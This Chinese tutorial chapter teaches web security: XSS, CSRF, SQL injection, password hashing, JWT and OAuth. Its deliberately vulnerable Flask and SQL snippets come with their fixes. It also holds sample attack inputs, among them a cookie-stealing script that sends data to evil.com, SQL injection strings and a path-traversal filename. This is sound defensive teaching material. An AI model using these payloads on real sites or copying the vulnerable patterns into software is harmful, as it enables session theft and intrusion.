---
title: AI时代全栈知识边界·25|Web漏洞与鉴权
book: AI时代全栈知识边界
chapter: 安全
event: Web漏洞与鉴权
sort: 1
chapter_sort: 12
created_at: 2026-06-30
source_agents: [fullstack-expert]
---
# AI时代全栈知识边界·25|Web漏洞与鉴权

> 前置知识:能写出一个带登录表单的 Web 接口、知道 Cookie 与 Session 的基本关系、理解 HTTP 请求/响应的基本结构
> 学完你能:① 区分 XSS 三种类型并给出对应的输出转义方案 ② 说清 CSRF 为什么需要 SameSite + Token 双重防御 ③ 用参数化查询防御 SQL 注入、识别 ORM raw query 的注入陷阱 ④ 用 bcrypt/Argon2 设计密码存储、解释为什么 MD5 不可接受 ⑤ 签发与验证 JWT、设计 Access Token + Refresh Token 流程 ⑥ 走通 OAuth 2.0 授权码 + PKCE 流程 ⑦ 判断哪些安全实现可交给 AI、哪些必须自己把关

### 一、概念

Web 漏洞与鉴权的一句话定义:**Web 漏洞是攻击者利用 HTTP 应用层输入与输出的信任边界破坏机密性、完整性或可用性的缺陷,鉴权(Authentication/Authorization)是确认"你是谁"与"你能做什么"的信任建立机制**。两者互为表里——绝大多数 Web 漏洞的最终目标是绕过鉴权或越权,而鉴权机制本身设计失误就是最高危的漏洞。

术语对齐:OWASP(Open Worldwide Application Security Project,开放式 Web 应用安全项目)是发布 Top 10 风险清单的非营利组织;XSS(Cross-Site Scripting,跨站脚本攻击)是注入脚本到受害者浏览器的攻击;CSRF(Cross-Site Request Forgery,跨站请求伪造)是借用受害者已登录身份发起请求的攻击;CSP(Content Security Policy,内容安全策略)是浏览器侧限制脚本来源的响应头;JWT(JSON Web Token)是 RFC 7519 定义的自包含令牌格式;OAuth 2.0 是 RFC 6749 定义的授权框架;PKCE(Proof Key for Code Exchange,代码交换证明密钥)是 RFC 7636 为公开客户端增强授权码流程的扩展;HSTS(HTTP Strict Transport Security,严格传输安全)是强制浏览器走 HTTPS 的响应头;bcrypt/scrypt/Argon2 是三类"故意慢"的密码哈希算法。

划清两条边界。第一,鉴权(Authentication,验证身份)与授权(Authorization,验证权限)是两件事,前者解决"你是谁",后者解决"你能做什么",工程上常缩写为 authn/authz,混淆会导致"已登录就能改任意用户数据"的越权漏洞。第二,加密(Encryption,可逆)与哈希(Hash,不可逆)在密码存储语境下不可互换——密码必须哈希,不能加密,因为加密意味着有人持有密钥就能还原明文,这与"系统也不该知道用户密码"的原则冲突。

### 二、原理

#### 1. XSS 三种类型为什么都需要输出转义

XSS 的本质是**用户输入的数据被浏览器当作代码执行**。攻击者注入的脚本一旦在受害者浏览器中运行,就能读 Cookie、发请求、改页面,等同接管会话。三种类型的差异是注入点不同,但触发条件一致:数据从"输入"流向"输出"时未被正确处理。

反射型 XSS(Reflected XSS):攻击者构造恶意 URL,诱骗用户点击;服务器把 URL 参数原样拼到响应 HTML 里,脚本在受害者浏览器执行。例如 `https://site.com/search?q=<script>...</script>`,服务器把 q 直接渲染进页面。存储型 XSS(Stored XSS):攻击者把脚本提交到数据库(如评论、个人简介),所有访问该页面的用户都中招,危害远大于反射型,因为不需要诱导点击。DOM 型 XSS(DOM-based XSS):漏洞完全在前端 JavaScript,服务器返回的页面是干净的,但前端代码把 `location.hash` 或 `location.search` 不经转义写进 `innerHTML`,脚本在 DOM 操作时被注入。

三种类型为什么都需要输出转义?因为根本机制是**数据与代码的混淆**。浏览器解析 HTML 时,遇到 `<script>` 就当代码,遇到普通文本就当数据;如果应用把用户输入直接放进 HTML,浏览器无法区分"这段是用户输入的数据"还是"这段是开发者写的代码"。唯一的解决办法是在数据离开应用、进入 HTML 之前,把 `<`、`>`、`&`、`"`、`'` 转义成 `&lt;`、`&gt;`、`&amp;`、`&quot;`、`&#x27;`,这样浏览器看到的永远是"被标记为数据的字符",不会被识别为标签或属性边界。

输出转义的关键是**按上下文转义**:放进 HTML 文本里、放进 HTML 属性里、放进 JavaScript 字符串里、放进 URL 里,各自的转义规则不同。`<script>` 标签内的内容即便 HTML 转义也无用,因为 JavaScript 解析器不认 `&lt;`;放进 `href` 属性里的输入要防 `javascript:` 协议。CSP 是输出转义的兜底防线:通过 `Content-Security-Policy: default-src 'self'; script-src 'self'` 限制脚本只能从同源加载,即使存在 XSS 漏洞,内联脚本与外部脚本也被浏览器拒绝执行,把"代码执行"的损害降到最低。但 CSP 不能替代转义——CSP 配置一疏漏(如允许 `unsafe-inline`),防线立刻失效。

#### 2. CSRF 为什么需要 SameSite + Token 双重防御

CSRF 的本质是**借用受害者浏览器自动携带的 Cookie 冒充受害者发起请求**。攻击者网站放一个表单或一个 `<img src="https://bank.com/transfer?to=attacker&amount=1000">`,用户访问攻击者网站时,浏览器对 bank.com 的请求会自动带上 bank.com 的 Cookie(因为用户已登录),服务器看到合法 Cookie 就执行了转账。攻击者拿不到 Cookie 内容,但浏览器代为携带,身份认证就这样被冒用。

SameSite Cookie 是浏览器层面的缓解。`Set-Cookie: session=xxx; SameSite=Lax` 告诉浏览器:跨站请求(顶层导航的 GET 例外)不带该 Cookie。`SameSite=Strict` 更严格,任何跨站都不带,代价是用户从外站链接跳转进来要重新登录。`SameSite=Lax` 是 Chrome 80+ 的默认值,挡住了大部分 CSRF(尤其非 GET 方法)。但 SameSite 不是万能:① 浏览器旧版本不支持;② 同站子域攻击(SameSite 按注册域算,`a.bank.com` 与 `b.bank.com` 是同站,子域被攻破仍可发起 CSRF);③ 依赖 Cookie 的方案才有效,但很多遗留系统 Session ID 走 Cookie。

CSRF Token 从根本机制上防御:服务器为每个会话生成随机 Token,渲染表单时写入隐藏字段,提交时服务器校验 Token 是否匹配。攻击者网站无法读到目标站的 Token(同源策略阻止跨域读 DOM),自然伪造不出合法请求。双重防御的必要性在于**单点失效的代价太高**:仅靠 SameSite,一旦浏览器策略变化或同站子域被攻破就破防;仅靠 Token,一旦 Token 校验逻辑漏了某条路径(如 GET 接口)就破防。两者叠加,攻击者要同时绕过浏览器策略与应用校验,难度指数级上升。

工程实践上,Token 放自定义请求头(如 `X-CSRF-Token`)比放表单字段更通用,因为前端 SPA 走 fetch/XHR 时统一加头即可,GET 接口默认不携带,自然不需要校验。

#### 3. bcrypt 为什么比 MD5 慢得对

密码哈希的根本机制是**让攻击者破解单个密码的成本高到不划算**。攻击者拿到数据库后,常用字典攻击:预计算几亿个常见密码的哈希,与库里的哈希比对。哈希算法越快,字典攻击每秒能试的次数越多,破解越容易。

MD5/SHA1/SHA256 是通用哈希,设计目标是"快"——它们用于数据完整性校验,要在每秒处理 GB 级数据。GPU 上 MD5 每秒能算几十亿次,常见密码字典几秒就被穷举。所以用 MD5 存密码,等同于没加密。

bcrypt 是为密码存储专门设计的"慢哈希"。它有两个关键设计:① **可调成本因子(cost factor)**:`bcrypt(password, salt, cost=12)` 中的 cost 每加 1,计算时间翻倍。硬件升级后,把 cost 从 10 调到 12,攻击者成本翻 4 倍,这是 MD5 永远做不到的;② **盐内嵌**:bcrypt 把 salt 与 cost 编码进输出哈希字符串,无需单独存 salt,验证时自动解析。bcrypt 还故意用大量内存访问,让 GPU 并行加速收益降低。

scrypt 在 bcrypt 基础上进一步要求大内存(数十 MB),让 ASIC/FPGA 定制硬件成本暴涨。Argon2 是 2015 年密码哈希竞赛冠军,同时可调计算成本、内存成本与并行度,是当前(2026 年)的推荐选择,Argon2id 是兼顾抗时序攻击与抗 GPU 的默认变体。三者的共同特征是"故意慢且可调",这是密码哈希与通用哈希的本质区别。

为什么"慢"是对的?因为正常用户登录一次,等 200ms 完全可接受;但攻击者要试 1 亿个密码,200ms × 1 亿 ≈ 230 天,而 MD5 在 GPU 上同样数量几分钟跑完。慢哈希把"用户体验可接受"与"攻击者不可接受"之间的鸿沟拉到最大。

### 三、实践

#### 1. XSS 漏洞代码与修复版

```html
<!-- 漏洞:把搜索词直接拼进 HTML,反射型 XSS -->
<div class="search-result">
  <p>你搜索的关键词是:{{ search_query }}</p>
</div>
```

```python
# 漏洞:Flask 关闭自动转义,直接渲染用户输入
from flask import Flask, request, render_template_string

app = Flask(__name__)
app.jinja_env.autoescape = False  # 危险:关闭了 Jinja2 自动转义

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # 攻击者构造 ?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
    # 直接被浏览器执行,用户 Cookie 被偷走
    return render_template_string(f'<p>你搜索的关键词是:{q}</p>')
```

```python
# 修复 1:开启 Jinja2 自动转义 + 显式 escape
from flask import Flask, request, render_template_string, make_response
from markupsafe import escape

app = Flask(__name__)
app.jinja_env.autoescape = True  # 默认即 True,这里强调不可关闭

@app.route('/search')
def search():
    q = request.args.get('q', '')
    # escape() 把 < > & " ' 转成 &lt; &gt; &amp; &quot; &#x27;
    # 浏览器看到的是文本字符,不会被识别为标签
    safe_q = escape(q)
    resp = make_response(render_template_string('<p>你搜索的关键词是:{{ q }}', q=safe_q))
    # 修复 2:加 CSP 头,即便存在残留 XSS,内联脚本也无法执行
    resp.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none'"
    return resp
```

```javascript
// 修复 3:DOM 型 XSS 的前端防御 —— textContent 替代 innerHTML
// 漏洞:element.innerHTML = location.hash.slice(1);  // 攻击者构造 #<img src=x onerror=alert(1)>
// 修复:
const element = document.getElementById('output');
element.textContent = location.hash.slice(1);  // textContent 永远不会被解析为 HTML
```

要点:① 永远不要关闭模板引擎的自动转义;② 即便用框架,DOM 操作时区分 `textContent`(安全)与 `innerHTML`(危险);③ CSP 是兜底,不能替代转义,生产环境禁用 `unsafe-inline`。

#### 2. JWT 签发与验证(Python)

JWT 由 Header(算法类型)、Payload(声明,如 sub/iat/exp)、Signature(签名)三段组成,以点号分隔。Header 与 Payload 是 Base64Url 编码(可逆,不加密),Signature 用 Header 指定的算法(HS256/RS256 等)对 `base64(header).base64(payload)` 签名。验证时重算签名比对,任意一段被改签名都对不上——这是 JWT 防篡改的根本机制。Payload 因此不能放密码等敏感字段,Base64Url 任何人都能解码读取。

```python
# 依赖: pip install pyjwt==2.8.0  (Python 3.9+)
import jwt
import time
import secrets

# 密钥保管:从环境变量读取,禁止硬编码进代码库
# 签发与验证使用同一密钥(HS256);生产推荐 RS256(私钥签发、公钥验证,服务可分布)
SECRET_KEY = secrets.token_urlsafe(32)  # 仅示例,实际从 K8s Secret / Vault 读取

ACCESS_TOKEN_TTL = 15 * 60          # 访问令牌 15 分钟
REFRESH_TOKEN_TTL = 7 * 24 * 3600   # 刷新令牌 7 天

def issue_tokens(user_id: str) -> dict:
    """签发 Access Token + Refresh Token"""
    now = int(time.time())
    access_payload = {
        'sub': user_id,            # subject: 用户标识
        'iat': now,                # issued at: 签发时间
        'exp': now + ACCESS_TOKEN_TTL,  # expiration: 过期时间(必填,验签时自动校验)
        'type': 'access',
    }
    refresh_payload = {
        'sub': user_id,
        'iat': now,
        'exp': now + REFRESH_TOKEN_TTL,
        'type': 'refresh',
        'jti': secrets.token_hex(16),  # JWT ID: 用于吊销黑名单(Refresh Token 才需要)
    }
    access_token = jwt.encode(access_payload, SECRET_KEY, algorithm='HS256')
    refresh_token = jwt.encode(refresh_payload, SECRET_KEY, algorithm='HS256')
    return {'access_token': access_token, 'refresh_token': refresh_token}

def verify_token(token: str, expected_type: str = 'access') -> dict:
    """验证 token,返回 payload 或抛异常"""
    try:
        # pyjwt 自动校验 exp(过期抛 ExpiredSignatureError)
        # 自动校验签名(篡改抛 InvalidSignatureError)
        # algorithms 必须显式声明,否则攻击者可用 alg:none 绕过
        payload = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
        if payload.get('type') != expected_type:
            raise jwt.InvalidTokenError(f'期望 {expected_type} 类型,实得 {payload.get("type")}')
        return payload
    except jwt.ExpiredSignatureError:
        raise  # 上层捕获后提示用户用 Refresh Token 换新 Access Token
    except jwt.InvalidTokenError:
        raise  # 任何验证失败一律拒绝,不泄露具体原因给客户端

def refresh_access_token(refresh_token: str) -> dict:
    """用 Refresh Token 换新的 Access Token"""
    payload = verify_token(refresh_token, expected_type='refresh')
    # 实际生产还要校验 jti 是否在黑名单(用户登出时把 Refresh Token 的 jti 加入 Redis 黑名单)
    return issue_tokens(payload['sub'])

# ---- 用法 ----
tokens = issue_tokens('user_42')
print('Access Token:', tokens['access_token'])

# 模拟携带 token 访问受保护接口
payload = verify_token(tokens['access_token'], 'access')
print('当前用户:', payload['sub'])  # user_42

# 模拟攻击者篡改 payload(改 sub 为 admin)
import base64
parts = tokens['access_token'].split('.')
tampered_payload = base64.urlsafe_b64encode(b'{"sub":"admin","type":"access"}').rstrip(b'=').decode()
tampered_token = parts[0] + '.' + tampered_payload + '.' + parts[2]
try:
    verify_token(tampered_token, 'access')  # 抛 InvalidSignatureError,签名校验失败
except jwt.InvalidTokenError as e:
    print('篡改被拒绝:', type(e).__name__)
```

要点:① Access Token 短有效(15 分钟),Refresh Token 长有效(7 天),前者无状态、后者可吊销;② 签名算法显式声明 `algorithms=['HS256']`,不写会被攻击者用 `alg: none` 绕过(经典漏洞);③ 密钥从环境变量/Secret 管理服务读取,不入代码库;④ Refresh Token 的 jti 配合黑名单实现吊销,这是 JWT 唯一能"主动失效"的工程手段。

#### 3. SQL 注入与参数化查询

```python
# 漏洞:把用户输入直接拼进 SQL
import sqlite3

def login_vulnerable(conn, username, password):
    cursor = conn.cursor()
    # 攻击者输入 username = "admin' --" 或 "admin' OR '1'='1"
    # 拼出来的 SQL:SELECT * FROM users WHERE username='admin' --' AND password='...'
    # 注释符 -- 后面的密码校验被吃掉,无密码登录成功
    sql = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(sql)  # 危险:execute 收到的是已拼接的字符串
    return cursor.fetchone()

# 攻击示例
conn = sqlite3.connect(':memory:')
conn.execute('CREATE TABLE users (username TEXT, password TEXT)')
conn.execute("INSERT INTO users VALUES ('admin', 'secret')")
conn.commit()

# 这条会绕过密码校验,返回 admin 行
print(login_vulnerable(conn, "admin' --", "anything"))
```

```python
# 修复:用占位符,让数据库驱动负责转义
def login_safe(conn, username, password):
    cursor = conn.cursor()
    # ? 是占位符,数据库驱动会把 username/password 当作"数据"而非"代码"
    # 攻击者的 ' OR '1'='1 会被原样作为字符串比较,不会被解析为 SQL 语法
    sql = "SELECT * FROM users WHERE username=? AND password=?"
    cursor.execute(sql, (username, password))  # 参数以元组传入
    return cursor.fetchone()

# 同样的攻击输入,这次返回 None(查不到)
print(login_safe(conn, "admin' --", "anything"))  # None
print(login_safe(conn, "admin", "secret"))        # 正常登录,返回 admin 行
```

```python
# ORM 仍可能注入的场景:raw query 与字符串拼接
from sqlalchemy import text
from sqlalchemy.orm import Session

def search_by_name_raw_dangerous(session: Session, name: str):
    # 漏洞:即便用了 ORM,text() 里仍然字符串拼接
    sql = text(f"SELECT * FROM products WHERE name LIKE '%{name}%'")
    return session.execute(sql).fetchall()

def search_by_name_raw_safe(session: Session, name: str):
    # 修复:text() 用 :name 命名占位符,参数以字典传入
    sql = text("SELECT * FROM products WHERE name LIKE :name")
    return session.execute(sql, {'name': f'%{name}%'}).fetchall()

def search_by_name_orm(session: Session, name: str):
    # 最安全:ORM 原生查询,自动参数化
    from models import Product
    return session.query(Product).filter(Product.name.like(f'%{name}%')).all()
```

要点:① 参数化查询的根本机制是**把数据与语法分离**,数据库预编译 SQL 模板后,参数只作为值参与比较,不会被解析为 SQL 语法;② ORM 默认参数化,但 `text()`、`raw()`、`execute(f"...{x}")` 这类 raw query 仍可能注入;③ 即便用 ORM,凡是自己拼字符串的地方都要警惕;④ LIKE 查询的通配符 `%` `_` 还需额外转义,否则用户输入 `%` 会匹配全部行。

### 四、速查/自测

#### OWASP Top 10(2021 版)速查表

| 编号 | 风险类别 | 典型场景 | 核心防御 |
|---|---|---|---|
| A01 | 访问控制失效(Broken Access Control) | 越权访问、URL 改 ID 查他人数据 | 服务端逐请求校验权限,默认拒绝 |
| A02 | 加密失败(Cryptographic Failures) | 明文传密码、MD5 存密码、弱 TLS | HTTPS + bcrypt/Argon2 + TLS 1.2+ |
| A03 | 注入(Injection) | SQL/NoSQL/命令/LDAP 注入 | 参数化查询、白名单校验 |
| A04 | 不安全设计(Insecure Design) | 缺乏威胁建模、业务流程可滥用 | 设计阶段引入威胁建模 |
| A05 | 安全配置错误(Security Misconfiguration) | 默认凭证、目录列出、错误信息泄露 | 加固基线、关闭调试、最小权限 |
| A06 | 脆弱过时组件(Vulnerable Components) | 第三方库 CVE 未修 | 依赖扫描(SCA)、定期升级 |
| A07 | 身份认证失败(Identification & Auth Failures) | 弱密码、凭证填充、会话不失效 | 限流、多因素、强制登出 |
| A08 | 软件数据完整性失败(Software & Data Integrity) | CI/CD 未签名、反序列化不可信数据 | 签名校验、禁用不安全反序列化 |
| A09 | 日志监控失败(Security Logging Failures) | 入侵无日志、无告警 | 关键事件必记、异常告警 |
| A10 | 服务端请求伪造 SSRF(Server-Side Request Forgery) | 后端请求用户提供的 URL | URL 白名单、内网 IP 拦截 |

#### 自测题

1. **原理层**:为什么 DOM 型 XSS 服务器返回的 HTML 是干净的,仍然算 XSS?
   参考答案:XSS 的判定标准是"用户输入的数据在受害者浏览器中被当代码执行",不取决于漏洞发生在服务器还是客户端。DOM 型 XSS 的注入点在前端 JavaScript:`element.innerHTML = location.hash.slice(1)` 把 URL 锚点直接写进 DOM,攻击者构造 `#<img src=x onerror=...>`,脚本在前端执行。服务器全程没参与,但用户浏览器里脚本照样跑了,危害与反射型 XSS 一致。防御是前端用 `textContent` 替代 `innerHTML`,或对插入 DOM 前的数据做上下文转义。

2. **原理层**:为什么 JWT 用 HS256 时签发与验证必须用同一密钥,而 RS256 可以分开?
   参考答案:HS256(HMAC + SHA256)是对称加密,同一个密钥既用于签名也用于验证,所以签发方与验证方必须共享密钥,任何拿到密钥的服务都能伪造 token,密钥分发面大。RS256(RSA + SHA256)是非对称加密,私钥签名、公钥验证,签发方独占私钥,验证方只拿公钥(公钥泄漏也无法伪造),适合多服务验证同一签发方的场景。生产环境若有多服务验证 token,优先 RS256;单体应用 HS256 足够。

3. **实践层**:用户反馈账号被盗,你的密码库用的是 MD5,怎么应急?
   参考答案:三步应急:① 立即强制所有用户重置密码,旧 MD5 哈希全部作废;② 上线新注册/改密流程,改用 Argon2id(或 bcrypt cost=12),旧库迁移时用户下次登录用旧密码验证后立即重算为新哈希;③ 排查日志确认是否大规模撞库或拖库,补接口限流与异地登录告警。教训:MD5 存密码是已知错误,迁移不能等事故,平时就该用慢哈希并预留 cost 可调。

4. **思路层**:SameSite=Lax 已经是浏览器默认,为什么仍要配 CSRF Token?
   参考答案:三方面:① SameSite 按注册域算,同站子域(`a.bank.com` 与 `b.bank.com`)互视为同站,子域被 XSS 攻破仍可发起 CSRF;② 旧浏览器(IE11 等)不支持 SameSite,部分用户裸奔;③ 单点防御失效代价高——浏览器策略一旦调整或某接口漏配,应用层无第二道防线。Token 是应用层独立校验,不依赖浏览器行为,两者叠加把破防条件从"绕过浏览器"升级为"同时绕过浏览器与应用",这是纵深防御的本质。

5. **实践层**:用户上传头像,你校验了扩展名是 .jpg,为什么仍可能被攻击?
   参考答案:扩展名校验远远不够,三道绕过:① 攻击者上传 `shell.php.jpg`,某些服务器(IIS 旧版)按最后一个点解析成 jpg,但 Apache 配置错误时按第一个点解析成 php;② 攻击者上传内容是 PHP 代码、扩展名是 .jpg 的文件,若服务器把上传目录当可执行目录,改个名或借助文件包含漏洞就能执行;③ 目录穿越:`../../var/www/shell.php` 当文件名,若服务器未过滤,直接写到 Web 根目录。正确做法:白名单扩展名 + 内容嗅探(读文件头 magic bytes 确认真实类型)+ 重命名存储(用 UUID 新名,丢弃原文件名)+ 上传目录禁止执行权限 + 独立子域提供静态文件服务。

### 可交给 AI 的部分

能放心交给 AI 的,是"有明确规范、可对照验收"的实现层代码:输出转义工具函数、bcrypt/Argon2 密码哈希封装、JWT 签发与验证的工具类、CSRF Token 生成与校验中间件、限流装饰器(基于 Redis 的令牌桶或滑动窗口)、参数化查询的 DAO 层、CSP 头与 HSTS 头的 Nginx 配置块、OAuth 2.0 授权码流程的服务端实现骨架、数据脱敏的格式化函数(手机号脱敏成 `138****1234`)。这些任务有 RFC 与 OWASP 官方文档做对照,AI 写错了一眼能看出来——bcrypt 输出长度固定、JWT 三段用点分隔、参数化查询不会有字符串拼接。验收方式也廉价:bcrypt 用 `bcrypt.checkpw` 验一遍、JWT 用 `jwt.decode` 跑一遍过期与篡改用例、CSP 用浏览器开发者工具看响应头。

不能交给 AI、必须自己把关的,是"涉及信任边界与隐式行为"的决策:密钥的保管方式(K8s Secret 还是 Vault,谁能访问)、JWT 过期与 Refresh Token 吊销策略(短 Access + 长 Refresh + 黑名单,黑名单存哪)、CSP 是否允许 `unsafe-inline`(一旦放开等于没设)、CORS 的 `Allow-Origin` 是否该用 `*`(配 `*` 就不能 `Allow-Credentials: true`)、文件上传目录是否真的禁止执行(配错一行 Nginx 就能执行 PHP)、限流阈值与降级策略(限太严误伤正常用户、限太松等于没限)、哪些字段需要脱敏(身份证号、手机号脱敏到几位)、第三方库的 CVE 评估(修不修、能不能修)。这些决策的特征是配错一时不报错、出事就是数据泄露事故——一个 CORS 配宽了平时一切正常,直到被批量爬数据;一个 JWT 过期太长平时用户无感,直到 token 泄漏被长期复用。

风险提示具体到四条:第一,AI 写的密码哈希常误用 `hashlib.md5` 或 `hashlib.sha256` 直接哈希,而非 bcrypt/Argon2,需要明确指定算法族;第二,AI 写的 JWT 验证常漏掉 `algorithms=['HS256']` 参数,这是 `alg: none` 攻击的入口,必须显式声明允许的算法;第三,AI 写的 SQL 即便用 ORM,在 `text()`、`raw()` 里仍可能字符串拼接,要逐一审 raw query;第四,AI 写的限流常按 IP 限,但 NAT 后大量用户共用一个公网 IP,误伤严重,正确做法是按"用户 ID + IP"组合限,或业务维度限(如同一用户每分钟发短信不超过 1 条)。判断标准很简单:涉及"密钥、过期、权限边界、阈值的取舍"这四类决策时,自己过一遍原理;涉及"工具函数、配置语法、流程骨架"时,大胆交给 AI 但跑一遍验收用例。

## 参考来源

- [1] 吴翰清:《白帽子讲 Web 安全》电子工业出版社 2012
- [2] 徐焱、贾晓璐:《Web安全深度剖析》电子工业出版社 2015
- [3] OWASP 官方《OWASP Top 10:2021》:https://owasp.org/Top10/
- [4] RFC 7519(JSON Web Token):https://www.rfc-editor.org/rfc/rfc7519
- [5] RFC 6749(The OAuth 2.0 Authorization Framework):https://www.rfc-editor.org/rfc/rfc6749
- [6] RFC 7636(PKCE):https://www.rfc-editor.org/rfc/rfc7636
- [7] RFC 6797(HTTP Strict Transport Security):https://www.rfc-editor.org/rfc/rfc6797
- [8] OWASP Cheat Sheet Series《Password Storage Cheat Sheet》:https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- [9] MDN Web Docs《Content Security Policy (CSP)》:https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
- [10] 本专栏第 09 章「分层模型与HTTP」(Cookie/Session/JWT 的网络层视角,本章为其安全层展开)
